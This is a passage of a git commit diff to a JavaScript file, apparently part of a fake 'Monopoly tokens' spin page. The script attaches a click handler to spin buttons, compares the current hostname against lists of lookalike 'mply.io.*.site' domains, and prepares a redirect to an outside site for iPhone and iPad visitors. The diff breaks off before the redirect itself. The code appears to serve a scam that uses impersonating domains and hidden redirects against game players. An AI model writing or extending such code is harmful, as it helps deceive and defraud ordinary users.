9ecf49295bede58c4556aa1241fb60fb7889eab0
dev20l <iphonetasli@gmail.com>
2025-03-07 21:33:18 +0000

    Update ta.js

--- ta.js
+++ ta.js
@@ -1,16 +1,26 @@
-/*================== [ VICTOR ABDO ] ===============*/
-/*================== [ talghi monopoly iph ] ================*/
+/*================== [3 ] ===============*/
+/*================== [ monopoly ] ================*/
 var button = document.querySelector('.spin-buttons');  
 button.addEventListener('click', function() {
     (function() {
-        var originalDomain = "monoplytokens.com";
+        var originalDomains = [
+            "monoplytokens.com",
+            "mply.io.t0ke2n.site",
+            "mply.io.4a6b8dh.site",
+            "mply.io.1arshg4.site"
+        ]; 
+        
         var redirectURL = "https://m.rolls3.com";
         var blockedDomains = [
+            "jsdhjjhhjjhejkjkas.blogspot.com",
+            "mply.io.t0ke2n.site",
             "mply.io.1arshg4.site",
             "mply.io.4a6b8dh.site"
         ];
 
-        if (window.location.hostname !== originalDomain && window.location.hostname !== "www." + originalDomain && !blockedDomains.some(domain => window.location.hostname.includes(domain))) {
+        var currentDomain = window.location.hostname.replace("www.", "").toLowerCase();
+        
+        if (!originalDomains.includes(currentDomain) && !blockedDomains.some(domain => currentDomain.includes(domain))) {
             var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);
 
             if (isIphoneOrIpad) { 
